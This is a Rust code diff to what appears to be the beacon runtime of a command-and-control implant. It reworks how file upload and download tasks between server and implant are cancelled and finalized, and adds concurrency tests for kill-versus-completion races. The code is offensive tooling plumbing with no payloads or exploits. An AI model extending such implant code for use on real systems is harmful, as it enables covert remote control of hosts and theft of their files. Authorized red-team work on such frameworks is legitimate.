@@ -59,6 +59,13 @@ pub struct BeaconRuntime {
     completed: Mutex<BoundedIds>,
     download: RwLock<Option<ActiveDownload>>,
     upload: RwLock<Option<ActiveUpload>>,
+    #[cfg(test)]
+    upload_install_barrier: Mutex<
+        Option<(
+            tokio::sync::mpsc::UnboundedSender<()>,
+            Arc<tokio::sync::Notify>,
+        )>,
+    >,
     stop: AtomicBool,
 }
 
@@ -68,53 +75,130 @@ enum TransferPhase {
     Finalizing,
 }
 
+#[derive(Clone, Copy, PartialEq, Eq)]
+enum TransferDecision {
+    Active,
+    Cancelled,
+    Terminal,
+}
+
+struct TransferControl {
+    decision: Mutex<TransferDecision>,
+}
+
+impl TransferControl {
+    fn new() -> Self {
+        Self {
+            decision: Mutex::new(TransferDecision::Active),
+        }
+    }
+
+    fn request_cancel(&self) -> bool {
+        let mut decision = self.decision.lock().unwrap();
+        if *decision != TransferDecision::Active {
+            return false;
+        }
+        *decision = TransferDecision::Cancelled;
+        true
+    }
+
+    fn decide_result(&self, result: TaskResult) -> Option<TaskResult> {
+        let mut decision = self.decision.lock().unwrap();
+        match *decision {
+            TransferDecision::Active => {
+                *decision = TransferDecision::Terminal;
+                Some(result)
+            }
+            TransferDecision::Cancelled => {
+                *decision = TransferDecision::Terminal;
+                Some(cancelled_result(result.task_id))
+            }
+            TransferDecision::Terminal => None,
+        }
+    }
+}
+
 struct ActiveUpload {
     transfer: Option<Upload>,
-    cancelled: Arc<AtomicBool>,
+    control: Arc<TransferControl>,
     completion: Option<tokio::sync::oneshot::Sender<TaskResult>>,
     phase: TransferPhase,
     task_id: Uuid,
+    #[cfg(test)]
+    terminal_barriers: Option<(Arc<std::sync::Barrier>, Arc<std::sync::Barrier>)>,
 }
 
 impl ActiveUpload {
-    fn new(transfer: Upload, completion: tokio::sync::oneshot::Sender<TaskResult>) -> Self {
+    fn new(
+        transfer: Upload,
+        control: Arc<TransferControl>,
+        completion: tokio::sync::oneshot::Sender<TaskResult>,
+    ) -> Self {
         let task_id = transfer.task_id();
         Self {
             transfer: Some(transfer),
-            cancelled: Arc::new(AtomicBool::new(false)),
+            control,
             completion: Some(completion),
             phase: TransferPhase::Active,
             task_id,
+            #[cfg(test)]
+            terminal_barriers: None,
         }
     }
 
     fn task_id(&self) -> Uuid {
         self.task_id
+    }
+
+    #[cfg(test)]
+    fn set_terminal_barriers(
+        &mut self,
+        reached: Arc<std::sync::Barrier>,
+        release: Arc<std::sync::Barrier>,
+    ) {
+        self.terminal_barriers = Some((reached, release));
     }
 }
 
 struct ActiveDownload {
     transfer: Option<Download>,
-    cancelled: Arc<AtomicBool>,
+    control: Arc<TransferControl>,
     completion: Option<tokio::sync::oneshot::Sender<TaskResult>>,
     phase: TransferPhase,
     task_id: Uuid,
+    #[cfg(test)]
+    terminal_barriers: Option<(Arc<std::sync::Barrier>, Arc<std::sync::Barrier>)>,
 }
 
 impl ActiveDownload {
-    fn new(transfer: Download, completion: tokio::sync::oneshot::Sender<TaskResult>) -> Self {
+    fn new(
+        transfer: Download,
+        control: Arc<TransferControl>,
+        completion: tokio::sync::oneshot::Sender<TaskResult>,
+    ) -> Self {
         let task_id = transfer.task_id();
         Self {
             transfer: Some(transfer),
-            cancelled: Arc::new(AtomicBool::new(false)),
+            control,
             completion: Some(completion),
             phase: TransferPhase::Active,
             task_id,
+            #[cfg(test)]
+            terminal_barriers: None,
         }
     }
 
     fn task_id(&self) -> Uuid {
         self.task_id
+    }
+
+    #[cfg(test)]
+    fn set_terminal_barriers(
+        &mut self,
+        reached: Arc<std::sync::Barrier>,
+        release: Arc<std::sync::Barrier>,
+    ) {
+        self.terminal_barriers = Some((reached, release));
     }
 }
 
@@ -129,6 +213,7 @@ struct BoundedIds {
 enum ActiveTask {
     Accepted,
     Running(tokio::task::AbortHandle),
+    Transfer(Arc<TransferControl>),
     Completing,
     Cancelled,
 }
@@ -274,8 +359,19 @@ impl BeaconRuntime {
             completed: Mutex::new(BoundedIds::default()),
             download: RwLock::new(None),
             upload: RwLock::new(None),
+            #[cfg(test)]
+            upload_install_barrier: Mutex::new(None),
             stop: AtomicBool::new(false),
         }
+    }
+
+    #[cfg(test)]
+    fn set_upload_install_barrier(
+        &self,
+        reached: tokio::sync::mpsc::UnboundedSender<()>,
+        release: Arc<tokio::sync::Notify>,
+    ) {
+        *self.upload_install_barrier.lock().unwrap() = Some((reached, release));
     }
 
     pub fn trigger_stop(&self) {
@@ -289,69 +385,65 @@ impl BeaconRuntime {
     /// Force-kill an in-flight task by task id. Returns true if a child was
     /// terminated. The awaiting runner turns the killed child into a result.
     pub async fn kill_task(&self, task_id: &Uuid) -> bool {
-        {
-            let mut slot = self.upload.write().unwrap();
-            if slot
-                .as_ref()
-                .is_some_and(|active| active.task_id() == *task_id)
-            {
-                let active = slot.as_mut().unwrap();
-                active.cancelled.store(true, Ordering::SeqCst);
-                if active.phase == TransferPhase::Active {
-                    let mut active = slot.take().unwrap();
-                    self.task_states
-                        .lock()
-                        .unwrap()
-                        .insert(*task_id, ActiveTask::Completing);
-                    if let Some(upload) = active.transfer.take() {
-                        let _ = upload.cancel();
-                    }
-                    if let Some(completion) = active.completion.take() {
-                        let _ = completion.send(cancelled_result(*task_id));
-                    }
-                }
-                return true;
-            }
-        }
-        {
-            let mut slot = self.download.write().unwrap();
-            if slot
-                .as_ref()
-                .is_some_and(|active| active.task_id() == *task_id)
-            {
-                let active = slot.as_mut().unwrap();
-                active.cancelled.store(true, Ordering::SeqCst);
-                if active.phase == TransferPhase::Active {
-                    let mut active = slot.take().unwrap();
-                    self.task_states
-                        .lock()
-                        .unwrap()
-                        .insert(*task_id, ActiveTask::Completing);
-                    active.transfer.take();
-                    if let Some(completion) = active.completion.take() {
-                        let _ = completion.send(cancelled_result(*task_id));
-                    }
-                }
-                return true;
-            }
-        }
-
         let mut states = self.task_states.lock().unwrap();
-        let killed = match states.get(task_id) {
+        let transfer_control = match states.get(task_id) {
             Some(ActiveTask::Running(handle)) => {
                 handle.abort();
                 states.insert(*task_id, ActiveTask::Cancelled);
-                true
+                return true;
             }
             Some(ActiveTask::Accepted | ActiveTask::Cancelled) => {
                 states.insert(*task_id, ActiveTask::Cancelled);
-                true
+                return true;
             }
-            Some(ActiveTask::Completing) => false,
-            None => false,
+            Some(ActiveTask::Transfer(control)) => Arc::clone(control),
+            Some(ActiveTask::Completing) | None => return false,
         };
         drop(states);
-        killed
+        if !transfer_control.request_cancel() {
+            return false;
+        }
+
+        let mut upload = self.upload.write().unwrap();
+        if upload
+            .as_ref()
+            .is_some_and(|active| active.task_id() == *task_id)
+        {
+            if upload.as_ref().unwrap().phase == TransferPhase::Active {
+                let mut active = upload.take().unwrap();
+                self.task_states
+                    .lock()
+                    .unwrap()
+                    .insert(*task_id, ActiveTask::Completing);
+                if let Some(transfer) = active.transfer.take() {
+                    let _ = transfer.cancel();
+                }
+                if let Some(completion) = active.completion.take() {
+                    let _ = completion.send(cancelled_result(*task_id));
+                }
+            }
+            return true;
+        }
+        drop(upload);
+
+        let mut download = self.download.write().unwrap();
+        if download
+            .as_ref()
+            .is_some_and(|active| active.task_id() == *task_id)
+        {
+            if download.as_ref().unwrap().phase == TransferPhase::Active {
+                let mut active = download.take().unwrap();
+                self.task_states
+                    .lock()
+                    .unwrap()
+                    .insert(*task_id, ActiveTask::Completing);
+                active.transfer.take();
+                if let Some(completion) = active.completion.take() {
+                    let _ = completion.send(cancelled_result(*task_id));
+                }
+            }
+        }
+        true
     }
 
     fn accept_task(&self, task_id: Uuid) -> bool {
@@ -563,35 +655,68 @@ impl BeaconRuntime {
 
         // Write any server->implant upload chunks; finalize when fully received.
         if !pr.push_chunks.is_empty() {
-            let mut up = self.upload.write().unwrap();
-            let mut failure: Option<(Uuid, String)> = None;
-            if let Some(active) = up.as_mut()
-                && let Some(u) = active.transfer.as_mut()
-            {
-                for chunk in &pr.push_chunks {
-                    match u.write_chunk(chunk) {
-                        Ok(_) => {}
-                        Err(error) => {
-                            failure = Some((u.task_id(), error));
+            let failure = {
+                let mut slot = self.upload.write().unwrap();
+                let mut error = None;
+                if let Some(active) = slot.as_mut()
+                    && active.phase == TransferPhase::Active
+                    && let Some(upload) = active.transfer.as_mut()
+                {
+                    for chunk in &pr.push_chunks {
+                        if let Err(write_error) = upload.write_chunk(chunk) {
+                            error = Some(write_error);
                             break;
                         }
                     }
                 }
-            }
-            if let Some((task_id, error)) = failure {
-                let mut active = up.take().unwrap();
-                self.task_states
-                    .lock()
-                    .unwrap()
-                    .insert(task_id, ActiveTask::Completing);
-                if let Some(completion) = active.completion.take() {
-                    let _ = completion.send(TaskResult {
-                        task_id,
-                        ok: false,
-                        stdout: Vec::new(),
-                        stderr: error.into_bytes(),
-                        exit_code: -1,
-                    });
+                error.and_then(|error| {
+                    let active = slot.as_mut()?;
+                    active.phase = TransferPhase::Finalizing;
+                    Some((
+                        active.transfer.take()?,
+                        Arc::clone(&active.control),
+                        active.task_id,
+                        error,
+                    ))
+                })
+            };
+            if let Some((upload, control, task_id, error)) = failure {
+                let result = {
+                    let mut decision = control.decision.lock().unwrap();
+                    match *decision {
+                        TransferDecision::Cancelled => {
+                            drop(decision);
+                            let _ = upload.cancel();
+                            Some(cancelled_result(task_id))
+                        }
+                        TransferDecision::Active => {
+                            let _ = upload.cancel();
+                            *decision = TransferDecision::Terminal;
+                            Some(TaskResult {
+                                task_id,
+                                ok: false,
+                                stdout: Vec::new(),
+                                stderr: error.into_bytes(),
+                                exit_code: -1,
+                            })
+                        }
+                        TransferDecision::Terminal => None,
+                    }
+                };
+                if let Some(result) = result {
+                    let mut slot = self.upload.write().unwrap();
+                    if slot.as_ref().is_some_and(|active| {
+                        active.task_id() == task_id && active.phase == TransferPhase::Finalizing
+                    }) {
+                        let mut active = slot.take().unwrap();
+                        self.task_states
+                            .lock()
+                            .unwrap()
+                            .insert(task_id, ActiveTask::Completing);
+                        if let Some(completion) = active.completion.take() {
+                            let _ = completion.send(result);
+                        }
+                    }
                 }
             }
         }
@@ -626,16 +751,27 @@ impl BeaconRuntime {
                     self.completed.lock().unwrap().insert(task_id);
                     continue;
                 }
-                Some(ActiveTask::Running(_) | ActiveTask::Completing) => continue,
+                Some(ActiveTask::Running(_) | ActiveTask::Transfer(_) | ActiveTask::Completing) => {
+                    continue;
+                }
                 Some(ActiveTask::Accepted) => {}
                 None if states.len() < TASK_ID_MEMORY_LIMIT => {
                     states.insert(task_id, ActiveTask::Accepted);
                 }
                 None => continue,
             }
+            let transfer_control = matches!(task.command.as_str(), "nw/upload" | "nw/download")
+                .then(|| Arc::new(TransferControl::new()));
             let runtime = Arc::clone(&self);
-            let handle = tokio::spawn(async move { runtime.run_one(&task).await });
-            states.insert(task_id, ActiveTask::Running(handle.abort_handle()));
+            let task_control = transfer_control.clone();
+            let handle = tokio::spawn(async move { runtime.run_one(&task, task_control).await });
+            states.insert(
+                task_id,
+                match transfer_control {
+                    Some(control) => ActiveTask::Transfer(control),
+                    None => ActiveTask::Running(handle.abort_handle()),
+                },
+            );
             drop(states);
             let runtime = Arc::clone(&self);
             monitors.push(tokio::spawn(async move {
@@ -664,7 +800,7 @@ impl BeaconRuntime {
 
     /// Run one returned task, buffering its result for the next poll. Also
     /// handles the implanted local commands (`nw/*`).
-    async fn run_one(&self, task: &Task) {
+    async fn run_one(&self, task: &Task, transfer_control: Option<Arc<TransferControl>>) {
         if let Some(result) = crate::modules::execute(task).await {
             self.pending.lock().unwrap().push(result);
             return;
@@ -716,43 +852,62 @@ impl BeaconRuntime {
         if task.command == "nw/download" {
             match task.args.as_slice() {
                 [path, transfer_id] => {
+                    let control = transfer_control
+                        .as_ref()
+                        .expect("download task has transfer control");
                     let Ok(transfer_id) = Uuid::parse_str(transfer_id) else {
-                        self.pending.lock().unwrap().push(TaskResult {
+                        let result = TaskResult {
                             task_id: task.id,
                             ok: false,
                             stdout: Vec::new(),
                             stderr: b"invalid download transfer id".to_vec(),
                             exit_code: -1,
-                        });
+                        };
+                        if let Some(result) = control.decide_result(result) {
+                            self.pending.lock().unwrap().push(result);
+                        }
                         return;
                     };
                     let completion = {
-                        let mut slot = self.download.write().unwrap();
-                        if slot.is_some() {
-                            self.pending.lock().unwrap().push(TaskResult {
-                                task_id: task.id,
-                                ok: false,
-                                stdout: Vec::new(),
-                                stderr: b"a download is already in progress".to_vec(),
-                                exit_code: -1,
-                            });
+                        let mut decision = control.decision.lock().unwrap();
+                        if *decision == TransferDecision::Cancelled {
+                            *decision = TransferDecision::Terminal;
+                            self.pending.lock().unwrap().push(cancelled_result(task.id));
                             None
                         } else {
-                            match Download::open(path, transfer_id, task.id) {
-                                Ok(d) => {
-                                    let (sender, receiver) = tokio::sync::oneshot::channel();
-                                    *slot = Some(ActiveDownload::new(d, sender));
-                                    Some(receiver)
-                                }
-                                Err(e) => {
-                                    self.pending.lock().unwrap().push(TaskResult {
-                                        task_id: task.id,
-                                        ok: false,
-                                        stdout: Vec::new(),
-                                        stderr: e.into_bytes(),
-                                        exit_code: -1,
-                                    });
-                                    None
+                            let mut slot = self.download.write().unwrap();
+                            if slot.is_some() {
+                                *decision = TransferDecision::Terminal;
+                                self.pending.lock().unwrap().push(TaskResult {
+                                    task_id: task.id,
+                                    ok: false,
+                                    stdout: Vec::new(),
+                                    stderr: b"a download is already in progress".to_vec(),
+                                    exit_code: -1,
+                                });
+                                None
+                            } else {
+                                match Download::open(path, transfer_id, task.id) {
+                                    Ok(d) => {
+                                        let (sender, receiver) = tokio::sync::oneshot::channel();
+                                        *slot = Some(ActiveDownload::new(
+                                            d,
+                                            Arc::clone(control),
+                                            sender,
+                                        ));
+                                        Some(receiver)
+                                    }
+                                    Err(e) => {
+                                        *decision = TransferDecision::Terminal;
+                                        self.pending.lock().unwrap().push(TaskResult {
+                                            task_id: task.id,
+                                            ok: false,
+                                            stdout: Vec::new(),
+                                            stderr: e.into_bytes(),
+                                            exit_code: -1,
+                                        });
+                                        None
+                                    }
                                 }
                             }
                         }
@@ -763,64 +918,96 @@ impl BeaconRuntime {
                         self.pending.lock().unwrap().push(result);
                     }
                 }
-                _ => self.pending.lock().unwrap().push(TaskResult {
-                    task_id: task.id,
-                    ok: false,
-                    stdout: Vec::new(),
-                    stderr: b"usage: nw/download <path> <transfer-id>".to_vec(),
-                    exit_code: -1,
-                }),
+                _ => {
+                    let result = TaskResult {
+                        task_id: task.id,
+                        ok: false,
+                        stdout: Vec::new(),
+                        stderr: b"usage: nw/download <path> <transfer-id>".to_vec(),
+                        exit_code: -1,
+                    };
+                    if let Some(result) = transfer_control
+                        .as_ref()
+                        .expect("download task has transfer control")
+                        .decide_result(result)
+                    {
+                        self.pending.lock().unwrap().push(result);
+                    }
+                }
             }
             return;
         }
         if task.command == "nw/upload" {
             match task.args.as_slice() {
                 [dest, transfer_id] | [dest, transfer_id, _] | [dest, transfer_id, _, _] => {
+                    let control = transfer_control
+                        .as_ref()
+                        .expect("upload task has transfer control");
                     let Ok(transfer_id) = Uuid::parse_str(transfer_id) else {
-                        self.pending.lock().unwrap().push(TaskResult {
+                        let result = TaskResult {
                             task_id: task.id,
                             ok: false,
                             stdout: Vec::new(),
                             stderr: b"invalid upload transfer id".to_vec(),
                             exit_code: -1,
-                        });
+                        };
+                        if let Some(result) = control.decide_result(result) {
+                            self.pending.lock().unwrap().push(result);
+                        }
                         return;
                     };
+                    #[cfg(test)]
+                    let install_barrier = { self.upload_install_barrier.lock().unwrap().take() };
+                    #[cfg(test)]
+                    if let Some((reached, release)) = install_barrier {
+                        let _ = reached.send(());
+                        release.notified().await;
+                    }
                     let completion = {
-                        let mut slot = self.upload.write().unwrap();
-                        if slot.is_some() {
-                            self.pending.lock().unwrap().push(TaskResult {
-                                task_id: task.id,
-                                ok: false,
-                                stdout: Vec::new(),
-                                stderr: b"an upload is already in progress".to_vec(),
-                                exit_code: -1,
-                            });
+                        let mut decision = control.decision.lock().unwrap();
+                        if *decision == TransferDecision::Cancelled {
+                            *decision = TransferDecision::Terminal;
+                            self.pending.lock().unwrap().push(cancelled_result(task.id));
                             None
                         } else {
-                            let expected_total =
-                                task.args.get(2).and_then(|value| value.parse().ok());
-                            match crate::upload::Upload::open_with_total(
-                                dest,
-                                transfer_id,
-                                task.id,
-                                expected_total,
-                                task.args.get(3).filter(|value| !value.is_empty()).cloned(),
-                            ) {
-                                Ok(u) => {
-                                    let (sender, receiver) = tokio::sync::oneshot::channel();
-                                    *slot = Some(ActiveUpload::new(u, sender));
-                                    Some(receiver)
-                                }
-                                Err(e) => {
-                                    self.pending.lock().unwrap().push(TaskResult {
-                                        task_id: task.id,
-                                        ok: false,
-                                        stdout: Vec::new(),
-                                        stderr: e.into_bytes(),
-                                        exit_code: -1,
-                                    });
-                                    None
+                            let mut slot = self.upload.write().unwrap();
+                            if slot.is_some() {
+                                *decision = TransferDecision::Terminal;
+                                self.pending.lock().unwrap().push(TaskResult {
+                                    task_id: task.id,
+                                    ok: false,
+                                    stdout: Vec::new(),
+                                    stderr: b"an upload is already in progress".to_vec(),
+                                    exit_code: -1,
+                                });
+                                None
+                            } else {
+                                let expected_total =
+                                    task.args.get(2).and_then(|value| value.parse().ok());
+                                match crate::upload::Upload::open_with_total(
+                                    dest,
+                                    transfer_id,
+                                    task.id,
+                                    expected_total,
+                                    task.args.get(3).filter(|value| !value.is_empty()).cloned(),
+                                ) {
+                                    Ok(u) => {
+                                        let (sender, receiver) = tokio::sync::oneshot::channel();
+                                        *slot =
+                                            Some(ActiveUpload::new(u, Arc::clone(control), sender));
+                                        Some(receiver)
+                                    }
+                                    Err(e) => {
+                                        *decision = TransferDecision::Terminal;
+                                        self.pending.lock().unwrap().push(TaskResult {
+                                            task_id: task.id,
+                                            ok: false,
+                                            stdout: Vec::new(),
+                                            stderr: e.into_bytes(),
+                                            exit_code: -1,
+                                        });
+                                        None
+                                    }
                                 }
                             }
                         }
@@ -831,13 +1018,22 @@ impl BeaconRuntime {
                         self.pending.lock().unwrap().push(result);
                     }
                 }
-                _ => self.pending.lock().unwrap().push(TaskResult {
-                    task_id: task.id,
-                    ok: false,
-                    stdout: Vec::new(),
-                    stderr: b"usage: nw/upload <dest> <transfer-id>".to_vec(),
-                    exit_code: -1,
-                }),
+                _ => {
+                    let result = TaskResult {
+                        task_id: task.id,
+                        ok: false,
+                        stdout: Vec::new(),
+                        stderr: b"usage: nw/upload <dest> <transfer-id>".to_vec(),
+                        exit_code: -1,
+                    };
+                    if let Some(result) = transfer_control
+                        .as_ref()
+                        .expect("upload task has transfer control")
+                        .decide_result(result)
+                    {
+                        self.pending.lock().unwrap().push(result);
+                    }
+                }
             }
             return;
         }
@@ -973,7 +1169,7 @@ impl BeaconRuntime {
     }
 
     async fn finalize_upload(&self, ack: FileAck) {
-        let Some((upload, cancelled, task_id, destination)) = ({
+        let Some((upload, control, task_id, destination, terminal_barriers)) = ({
             let mut slot = self.upload.write().unwrap();
             let Some(active) = slot.as_mut() else {
                 return;
@@ -990,29 +1186,61 @@ impl BeaconRuntime {
             let upload = active.transfer.take().unwrap();
             let task_id = active.task_id;
             let destination = upload.dest.clone();
-            Some((upload, Arc::clone(&active.cancelled), task_id, destination))
+            #[cfg(test)]
+            let terminal_barriers = active.terminal_barriers.clone();
+            #[cfg(not(test))]
+            let terminal_barriers: Option<(
+                Arc<std::sync::Barrier>,
+                Arc<std::sync::Barrier>,
+            )> = None;
+            Some((
+                upload,
+                Arc::clone(&active.control),
+                task_id,
+                destination,
+                terminal_barriers,
+            ))
         }) else {
             return;
         };
 
-        let outcome = upload.finalize_with_cancellation(&cancelled);
-        let result = match outcome {
-            Ok(()) => TaskResult {
-                task_id,
-                ok: true,
-                stdout: format!("uploaded {} bytes to {destination}", ack.received).into_bytes(),
-                stderr: Vec::new(),
-                exit_code: 0,
-            },
-            Err(_error) if cancelled.load(Ordering::SeqCst) => cancelled_result(task_id),
-            Err(error) => TaskResult {
-                task_id,
-                ok: false,
-                stdout: Vec::new(),
-                stderr: error.into_bytes(),
-                exit_code: -1,
-            },
+        let validation = upload.validate();
+        let result = {
+            let mut decision = control.decision.lock().unwrap();
+            match *decision {
+                TransferDecision::Cancelled => {
+                    drop(decision);
+                    let _ = upload.cancel();
+                    cancelled_result(task_id)
+                }
+                TransferDecision::Active => {
+                    let result = match validation.and_then(|()| upload.publish()) {
+                        Ok(()) => TaskResult {
+                            task_id,
+                            ok: true,
+                            stdout: format!("uploaded {} bytes to {destination}", ack.received)
+                                .into_bytes(),
+                            stderr: Vec::new(),
+                            exit_code: 0,
+                        },
+                        Err(error) => TaskResult {
+                            task_id,
+                            ok: false,
+                            stdout: Vec::new(),
+                            stderr: error.into_bytes(),
+                            exit_code: -1,
+                        },
+                    };
+                    *decision = TransferDecision::Terminal;
+                    result
+                }
+                TransferDecision::Terminal => return,
+            }
         };
+        if let Some((reached, release)) = terminal_barriers {
+            reached.wait();
+            release.wait();
+        }
         let mut slot = self.upload.write().unwrap();
         if slot.as_ref().is_some_and(|active| {
             active.task_id() == task_id && active.phase == TransferPhase::Finalizing
@@ -1029,7 +1257,7 @@ impl BeaconRuntime {
     }
 
     async fn finalize_download(&self, ack: FileAck) {
-        let Some((download, cancelled, task_id, size)) = ({
+        let Some((download, control, task_id, size, terminal_barriers)) = ({
             let mut slot = self.download.write().unwrap();
             let Some(active) = slot.as_mut() else {
                 return;
@@ -1046,29 +1274,57 @@ impl BeaconRuntime {
             let download = active.transfer.take().unwrap();
             let task_id = active.task_id;
             let size = download.size;
-            Some((download, Arc::clone(&active.cancelled), task_id, size))
+            #[cfg(test)]
+            let terminal_barriers = active.terminal_barriers.clone();
+            #[cfg(not(test))]
+            let terminal_barriers: Option<(
+                Arc<std::sync::Barrier>,
+                Arc<std::sync::Barrier>,
+            )> = None;
+            Some((
+                download,
+                Arc::clone(&active.control),
+                task_id,
+                size,
+                terminal_barriers,
+            ))
         }) else {
             return;
         };
 
-        let outcome = download.finalize_with_cancellation(&cancelled);
-        let result = match outcome {
-            Ok(()) => TaskResult {
-                task_id,
-                ok: true,
-                stdout: format!("downloaded {} bytes of {size}", ack.received).into_bytes(),
-                stderr: Vec::new(),
-                exit_code: 0,
-            },
-            Err(_error) if cancelled.load(Ordering::SeqCst) => cancelled_result(task_id),
-            Err(error) => TaskResult {
-                task_id,
-                ok: false,
-                stdout: Vec::new(),
-                stderr: error.into_bytes(),
-                exit_code: -1,
-            },
+        let validation = download.validate();
+        let result = {
+            let mut decision = control.decision.lock().unwrap();
+            match *decision {
+                TransferDecision::Cancelled => cancelled_result(task_id),
+                TransferDecision::Active => {
+                    let result = match validation {
+                        Ok(()) => TaskResult {
+                            task_id,
+                            ok: true,
+                            stdout: format!("downloaded {} bytes of {size}", ack.received)
+                                .into_bytes(),
+                            stderr: Vec::new(),
+                            exit_code: 0,
+                        },
+                        Err(error) => TaskResult {
+                            task_id,
+                            ok: false,
+                            stdout: Vec::new(),
+                            stderr: error.into_bytes(),
+                            exit_code: -1,
+                        },
+                    };
+                    *decision = TransferDecision::Terminal;
+                    result
+                }
+                TransferDecision::Terminal => return,
+            }
         };
+        if let Some((reached, release)) = terminal_barriers {
+            reached.wait();
+            release.wait();
+        }
         let mut slot = self.download.write().unwrap();
         if slot.as_ref().is_some_and(|active| {
             active.task_id() == task_id && active.phase == TransferPhase::Finalizing
@@ -1664,6 +1920,323 @@ mod tests {
         .expect("next download FIFO slot");
         assert!(runtime.kill_task(&next.id).await);
         next_runner.await.unwrap();
+    }
+
+    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
+    async fn kill_after_upload_success_decision_returns_false_and_keeps_success() {
+        let runtime = Arc::new(runtime());
+        let directory = tempfile::tempdir().unwrap();
+        let destination = directory.path().join("decided-upload.bin");
+        let transfer_id = Uuid::new_v4();
+        let task = Task {
+            id: Uuid::new_v4(),
+            command: "nw/upload".into(),
+            args: vec![
+                destination.to_string_lossy().into_owned(),
+                transfer_id.to_string(),
+                "3".into(),
+            ],
+            timeout_ms: 60_000,
+        };
+        assert!(runtime.accept_task(task.id));
+        let runner = tokio::spawn(Arc::clone(&runtime).execute(vec![task.clone()]));
+        tokio::time::timeout(Duration::from_secs(2), async {
+            while runtime.upload.read().unwrap().is_none() {
+                tokio::task::yield_now().await;
+            }
+        })
+        .await
+        .unwrap();
+        let reached = Arc::new(std::sync::Barrier::new(2));
+        let release = Arc::new(std::sync::Barrier::new(2));
+        {
+            let mut slot = runtime.upload.write().unwrap();
+            let active = slot.as_mut().unwrap();
+            active
+                .transfer
+                .as_mut()
+                .unwrap()
+                .write_chunk(&nw_profile::msgs::FileChunk {
+                    transfer_id: Some(transfer_id),
+                    task_id: Some(task.id),
+                    name: destination.to_string_lossy().into_owned(),
+                    offset: 0,
+                    total: 3,
+                    data: b"new".to_vec(),
+                })
+                .unwrap();
+            active.set_terminal_barriers(Arc::clone(&reached), Arc::clone(&release));
+        }
+        let finalizer = {
+            let runtime = Arc::clone(&runtime);
+            tokio::spawn(async move {
+                runtime
+                    .finalize_upload(FileAck {
+                        transfer_id: Some(transfer_id),
+                        received: 3,
+                        total: 3,
+                        done: true,
+                    })
+                    .await;
+            })
+        };
+        tokio::task::spawn_blocking(move || reached.wait())
+            .await
+            .unwrap();
+
+        assert!(!runtime.kill_task(&task.id).await);
+        tokio::task::spawn_blocking(move || release.wait())
+            .await
+            .unwrap();
+        finalizer.await.unwrap();
+        runner.await.unwrap();
+
+        assert_eq!(std::fs::read(destination).unwrap(), b"new");
+        let results = runtime.pending.lock().unwrap();
+        let terminal = results
+            .iter()
+            .filter(|result| result.task_id == task.id)
+            .collect::<Vec<_>>();
+        assert_eq!(terminal.len(), 1);
+        assert!(terminal[0].ok);
+    }
+
+    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
+    async fn kill_after_download_success_decision_returns_false_and_keeps_success() {
+        let runtime = Arc::new(runtime());
+        let directory = tempfile::tempdir().unwrap();
+        let source = directory.path().join("decided-download.bin");
+        std::fs::write(&source, b"new").unwrap();
+        let transfer_id = Uuid::new_v4();
+        let task = Task {
+            id: Uuid::new_v4(),
+            command: "nw/download".into(),
+            args: vec![
+                source.to_string_lossy().into_owned(),
+                transfer_id.to_string(),
+            ],
+            timeout_ms: 60_000,
+        };
+        assert!(runtime.accept_task(task.id));
+        let runner = tokio::spawn(Arc::clone(&runtime).execute(vec![task.clone()]));
+        tokio::time::timeout(Duration::from_secs(2), async {
+            while runtime.download.read().unwrap().is_none() {
+                tokio::task::yield_now().await;
+            }
+        })
+        .await
+        .unwrap();
+        let reached = Arc::new(std::sync::Barrier::new(2));
+        let release = Arc::new(std::sync::Barrier::new(2));
+        runtime
+            .download
+            .write()
+            .unwrap()
+            .as_mut()
+            .unwrap()
+            .set_terminal_barriers(Arc::clone(&reached), Arc::clone(&release));
+        let finalizer = {
+            let runtime = Arc::clone(&runtime);
+            tokio::spawn(async move {
+                runtime
+                    .finalize_download(FileAck {
+                        transfer_id: Some(transfer_id),
+                        received: 3,
+                        total: 3,
+                        done: true,
+                    })
+                    .await;
+            })
+        };
+        tokio::task::spawn_blocking(move || reached.wait())
+            .await
+            .unwrap();
+
+        assert!(!runtime.kill_task(&task.id).await);
+        tokio::task::spawn_blocking(move || release.wait())
+            .await
+            .unwrap();
+        finalizer.await.unwrap();
+        runner.await.unwrap();
+
+        let results = runtime.pending.lock().unwrap();
+        let terminal = results
+            .iter()
+            .filter(|result| result.task_id == task.id)
+            .collect::<Vec<_>>();
+        assert_eq!(terminal.len(), 1);
+        assert!(terminal[0].ok);
+    }
+
+    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
+    async fn cancellation_before_upload_slot_installation_leaves_no_orphan() {
+        let runtime = Arc::new(runtime());
+        let directory = tempfile::tempdir().unwrap();
+        let destination = directory.path().join("never-installed.bin");
+        let transfer_id = Uuid::new_v4();
+        let task = Task {
+            id: Uuid::new_v4(),
+            command: "nw/upload".into(),
+            args: vec![
+                destination.to_string_lossy().into_owned(),
+                transfer_id.to_string(),
+                "3".into(),
+            ],
+            timeout_ms: 60_000,
+        };
+        let (reached, mut reached_rx) = tokio::sync::mpsc::unbounded_channel();
+        let release = Arc::new(tokio::sync::Notify::new());
+        runtime.set_upload_install_barrier(reached, Arc::clone(&release));
+        assert!(runtime.accept_task(task.id));
+        let runner = tokio::spawn(Arc::clone(&runtime).execute(vec![task.clone()]));
+        tokio::time::timeout(Duration::from_secs(2), reached_rx.recv())
+            .await
+            .unwrap()
+            .unwrap();
+
+        assert!(runtime.kill_task(&task.id).await);
+        release.notify_one();
+        runner.await.unwrap();
+
+        assert!(runtime.upload.read().unwrap().is_none());
+        assert!(!destination.exists());
+        assert!(
+            !directory
+                .path()
+                .join(format!("never-installed.bin.nwpart-{transfer_id}"))
+                .exists()
+        );
+        let results = runtime.pending.lock().unwrap();
+        assert_eq!(
+            results
+                .iter()
+                .filter(|result| result.task_id == task.id)
+                .count(),
+            1
+        );
+        assert!(
+            results
+                .iter()
+                .any(|result| result.task_id == task.id && !result.ok)
+        );
+        drop(results);
+
+        let next = Task {
+            id: Uuid::new_v4(),
+            command: "nw/upload".into(),
+            args: vec![
+                directory
+                    .path()
+                    .join("next.bin")
+                    .to_string_lossy()
+                    .into_owned(),
+                Uuid::new_v4().to_string(),
+                "1".into(),
+            ],
+            timeout_ms: 60_000,
+        };
+        assert!(runtime.accept_task(next.id));
+        let next_runner = tokio::spawn(Arc::clone(&runtime).execute(vec![next.clone()]));
+        tokio::time::timeout(Duration::from_secs(2), async {
+            while !runtime
+                .upload
+                .read()
+                .unwrap()
+                .as_ref()
+                .is_some_and(|active| active.task_id() == next.id)
+            {
+                tokio::task::yield_now().await;
+            }
+        })
+        .await
+        .unwrap();
